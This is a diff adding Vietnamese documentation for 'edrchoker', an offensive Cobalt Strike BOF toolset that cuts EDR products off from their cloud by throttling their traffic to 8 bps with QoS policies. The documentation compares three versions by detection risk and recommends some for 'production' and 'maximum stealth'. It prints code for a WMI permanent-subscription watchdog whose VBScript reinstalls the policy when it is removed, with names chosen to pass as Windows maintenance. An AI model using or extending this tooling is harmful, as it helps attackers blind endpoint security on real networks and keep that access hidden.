@@ -1057,3 +1057,190 @@ Sau khi apply full chain, EDR process vẫn running nhưng:
 - Không có TCP connection nào đến cloud tồn tại
 - Mọi connection attempt bị throttle về 8 bps
 - Tất cả layer trên persist sau reboot (QoS PersistentStore, registry routes, WMI subscription nếu cần)
+
+---
+
+## 11. So Sánh Ba Phiên Bản — v1, v2, v3
+
+### 11.1 Bảng So Sánh Toàn Diện
+
+| Tiêu chí | v1 (WMI + Watchdog) | v2 (WMI, không subscription) | v3 (Registry, không WMI) |
+|---------|--------------------|-----------------------------|--------------------------|
+| File | `edrchoker.bof.c` | `edrchoker_v2.bof.c` | `edrchoker_v3.bof.c` |
+| CNA | `edrchoker.cna` | `edrchoker_v2.cna` | `edrchoker_v3.cna` |
+| WMI COM | Có | Có | **Không** |
+| WMI subscription watchdog | **Có** (VBScript tự reinstall) | Không | Không |
+| Hiệu lực ngay | Có (ActiveStore) | Có (ActiveStore) | **Không** (cần reboot/gpupdate) |
+| Persist sau reboot | Có (PersistentStore + watchdog) | Có (PersistentStore) | Có (registry) |
+| DLL imports | OLE32, OLEAUT32, KERNEL32 | OLE32, OLEAUT32, KERNEL32 | **ADVAPI32, KERNEL32** |
+| DCOM local RPC | Có | Có | Không |
+| WMI provider events | Có | Có | **Không** |
+| Verify step sau PutInstance | Có | Không (đã bỏ) | N/A |
+| Filter list/remove_all | `ThrottleRateAction = '8'` | `ThrottleRateAction = '8'` | `Throttle Rate = "8"` |
+| Detection risk | **CAO** (T1546.003) | Trung bình | **Thấp** |
+| Windows support | Win 8.1+ (build 9600+) | Win 8.1+ (build 9600+) | Win Vista+ (build 6002+) |
+| Kích thước BOF | Lớn nhất | Lớn | Nhỏ nhất |
+| Khi nào dùng | Lab/nghiên cứu (watchdog cần thiết) | Production (immediate, persist) | Stealth cao nhất, chấp nhận delay |
+
+### 11.2 Khi Nào Dùng Phiên Bản Nào
+
+**Chọn v2 trong hầu hết trường hợp production:**
+- Hiệu lực ngay (ActiveStore), persist sau reboot (PersistentStore)
+- Không có WMI subscription → tránh T1546.003 alert
+- Cùng cơ chế pacer.sys với v1, không cần watchdog vì `AppPathNameMatchCondition` match theo tên process — EDR restart là bị throttle lại ngay
+
+**Chọn v3 khi cần stealth tối đa:**
+- Không có COM/WMI → không trigger WMI provider host events, không có DCOM RPC
+- Chỉ cần ADVAPI32 registry calls — surface attack nhỏ nhất
+- Trade-off: không immediate, phải chạy thêm `gpupdate /force` hoặc reboot
+
+**v1 chỉ dùng cho nghiên cứu:**
+- Watchdog subscription tạo detection IOC tĩnh trong WMI repository
+- Microsoft Defender và nhiều EDR khác có rule built-in cho T1546.003
+
+---
+
+## 12. Giải Thích Code v1 — Các Hàm Đặc Thù
+
+v1 (`edrchoker.bof.c`) có toàn bộ chức năng của v2 CỘNG với WMI subscription watchdog. Phần này giải thích các hàm **chỉ có ở v1**, không có ở v2/v3.
+
+### 12.1 WContains — Substring Search Không Dùng CRT
+
+```c
+static BOOL WContains(const wchar_t* str, const wchar_t* needle) {
+    int sLen = 0; while (str[sLen]) sLen++;
+    int nLen = 0; while (needle[nLen]) nLen++;
+    for (int i = 0; i <= sLen - nLen; i++) {
+        int match = 1;
+        for (int j = 0; j < nLen; j++) {
+            if (str[i + j] != needle[j]) { match = 0; break; }
+        }
+        if (match) return TRUE;
+    }
+    return FALSE;
+}
+```
+
+**Dùng để làm gì:** Fingerprint WMI subscription của ta khi enumerate trong `RemoveSubscription` và `ListPolicies`. Check field `Query` của `__EventFilter` có chứa `"MSFT_NetQosPolicySettingData"` không — nếu có thì đó là subscription của edrchoker, không phải của system.
+
+**Tại sao không dùng `wcsstr`:** `wcsstr` là CRT function. BOF không có CRT linkage.
+
+### 12.2 g_ScriptText — VBScript Watchdog
+
+```c
+static const wchar_t g_ScriptText[] =
+    L"Set svc = GetObject(\"winmgmts:\\\\.\\root\\standardcimv2\")\r\n"
+    L"Set cls = svc.Get(\"MSFT_NetQosPolicySettingData\")\r\n"
+    L"Set inst = cls.SpawnInstance_()\r\n"
+    L"inst.Name = \"" /* + embedded random name */ L"\"\r\n"
+    L"inst.ThrottleRateAction = \"8\"\r\n"
+    L"...\r\n"
+    L"svc.PutInstance inst, 1, Nothing, Nothing\r\n";
+```
+
+Script VBScript được inject vào `ActiveScriptEventConsumer`. Khi WMI phát hiện policy của ta bị xóa (qua `__InstanceDeletionEvent`), `WmiPrvSE.exe` invoke `scrobj.dll` để chạy script này. Script:
+1. Kết nối lại `ROOT\StandardCimv2` qua WMI moniker `"winmgmts:"`
+2. Spawn instance mới của `MSFT_NetQosPolicySettingData`
+3. Set các property tương tự (name cũ được embed vào script lúc `InstallSubscription`)
+4. Gọi `PutInstance` để ghi lại
+
+**Kết quả:** Policy tự phục hồi trong vòng ~10 giây sau khi bị xóa.
+
+**Detection:** `ActiveScriptEventConsumer` với script VBScript trong `ROOT\subscription` là IOC phổ biến nhất của T1546.003. Microsoft Defender có built-in alert cho pattern này.
+
+### 12.3 BuildWatchWQL — WQL cho Event Filter
+
+```c
+static void BuildWatchWQL(wchar_t* out, int max) {
+    WAppend(out, 0, max,
+        L"SELECT * FROM __InstanceDeletionEvent WITHIN 10 "
+        L"WHERE TargetInstance ISA 'MSFT_NetQosPolicySettingData' "
+        L"AND TargetInstance.ThrottleRateAction = '8'");
+}
+```
+
+**`__InstanceDeletionEvent WITHIN 10`:** WMI polling event. WMI kiểm tra mỗi 10 giây nếu có instance nào của class được chỉ định bị xóa. Không phải push notification — WMI tự poll bảng instance.
+
+**`ThrottleRateAction = '8'`:** Chỉ fire khi policy có rate = 8 bps bị xóa. Không trigger với system QoS deletion events.
+
+### 12.4 InstallSubscription — Cài WMI Permanent Subscription
+
+Ba object được tạo trong `ROOT\subscription` namespace:
+
+```
+1. __EventFilter "SchedMaint<rand>":
+   - EventNamespace = "ROOT\\StandardCimv2"
+   - QueryLanguage  = "WQL"
+   - Query          = BuildWatchWQL() output
+
+2. ActiveScriptEventConsumer "SchedMaint<rand>":
+   - ScriptingEngine = "VBScript"
+   - ScriptText      = g_ScriptText (watchdog script)
+
+3. __FilterToConsumerBinding:
+   - Filter   = "\\\\.\\ROOT\\subscription:__EventFilter.Name=..."
+   - Consumer = "\\\\.\\ROOT\\subscription:ActiveScriptEventConsumer.Name=..."
+```
+
+**Tại sao cần ba object:** Đây là WMI permanent subscription architecture:
+- `__EventFilter`: định nghĩa **điều kiện** (khi nào fire)
+- Consumer (`ActiveScriptEventConsumer`): định nghĩa **hành động** (làm gì khi fire)
+- `__FilterToConsumerBinding`: **liên kết** filter với consumer
+
+Thiếu binding → filter và consumer tồn tại riêng lẻ nhưng không kết nối — watchdog không hoạt động. Thiếu filter → consumer không biết khi nào chạy. Ba object phải cùng hiện diện.
+
+**Tên dùng prefix `SchedMaint`** để giả dạng Windows Scheduled Maintenance subscription — tên ngẫu nhiên bổ sung làm khó tìm IOC tĩnh.
+
+### 12.5 RemoveSubscription — Gỡ Watchdog
+
+```c
+static void RemoveSubscription(IWbemServices* pSub) {
+    // 1. ExecQuery ROOT\subscription cho __EventFilter
+    //    WHERE "MSFT_NetQosPolicySettingData" có trong field Query
+    // 2. DeleteInstance(__PATH) cho từng result
+    // 3. Lặp lại cho ActiveScriptEventConsumer
+    // 4. Lặp lại cho __FilterToConsumerBinding
+}
+```
+
+Dùng `WContains(queryField, L"MSFT_NetQosPolicySettingData")` để chỉ xóa subscription của ta. Không xóa system subscription (ví dụ: Windows Defender subscription có tên khác).
+
+`remove_all` trong v1 gọi **cả hai**: `ExecDeleteQuery()` (xóa QoS policies) **VÀ** `RemoveSubscription()` (gỡ watchdog). v2/v3 chỉ xóa QoS policies.
+
+### 12.6 ListPolicies(svc, sub) — Hiển Thị Kèm Trạng Thái Watchdog
+
+```c
+static void ListPolicies(IWbemServices* svc, IWbemServices* sub) {
+    // svc = kết nối ROOT\StandardCimv2
+    // sub = kết nối ROOT\subscription (để check watchdog)
+
+    // 1. Query: SELECT * FROM MSFT_NetQosPolicySettingData WHERE ThrottleRateAction = '8'
+    //    → print từng policy (AppPathNameMatchCondition, Name, InstanceID)
+
+    // 2. Query ROOT\subscription: SELECT * FROM __EventFilter
+    //    → dùng WContains để tìm filter của ta
+    //    → print "watchdog: active" hoặc "watchdog: not installed"
+}
+```
+
+v2 chỉ có `ListPolicies(svc)` — một param, không check watchdog (không có watchdog).
+
+---
+
+## 13. Fix Log — Các Lỗi Đã Sửa
+
+| File | Vấn đề gốc | Fix đã áp dụng |
+|------|-----------|----------------|
+| `edrchoker.bof.c` (v1) | `ListPolicies` dùng `SELECT * FROM MSFT_NetQosPolicySettingData` không filter → hiển thị toàn bộ QoS policy của hệ thống | Thêm `WHERE ThrottleRateAction = '8'` |
+| `edrchoker.bof.c` (v1) | `remove_all` dùng query không filter → có thể xóa system QoS policy | Thêm `WHERE ThrottleRateAction = '8'` |
+| `edrchoker.bof.c` (v1) | `PutI4()` defined nhưng không được gọi ở bất kỳ đâu (dead code) | Xóa hàm |
+| `edrchoker_v2.bof.c` (v2) | `CreatePolicy` có verify step: gọi `GetObject(__PATH)` sau `PutInstance` để xác nhận — thêm một COM round-trip không cần thiết | Bỏ verify block, đơn giản hóa output thành `active=%S persist=%S` |
+| `edrchoker_v2.bof.c` (v2) | `ListPolicies` và `remove_all` không filter (giống v1) | Thêm `WHERE ThrottleRateAction = '8'` |
+| `edrchoker_v3.bof.c` (v3) | `ListQosPolicies` liệt kê tất cả subkey trong `HKLM\...\QoS` — bao gồm cả policy của Group Policy/system | Đọc thêm `Throttle Rate` value per subkey, skip nếu ≠ `"8"` |
+| `edrchoker_v3.bof.c` (v3) | `DeleteQosPolicies(NULL)` (remove_all) xóa tất cả QoS registry key không phân biệt nguồn gốc | Thêm check: khi `matchList == NULL`, chỉ xóa nếu `Throttle Rate = "8"` |
+
+**Fingerprint của policy do edrchoker tạo:**
+- v1/v2 (WMI): `ThrottleRateAction = '8'` trong `MSFT_NetQosPolicySettingData`
+- v3 (Registry): value `Throttle Rate` = `"8"` trong registry subkey
+
+Không có policy QoS hợp lệ nào trong thực tế dùng 8 bps — đây là giá trị đủ nhỏ để là zero throughput nhưng vẫn là giá trị hợp lệ của field (không bị WMI/GP reject).
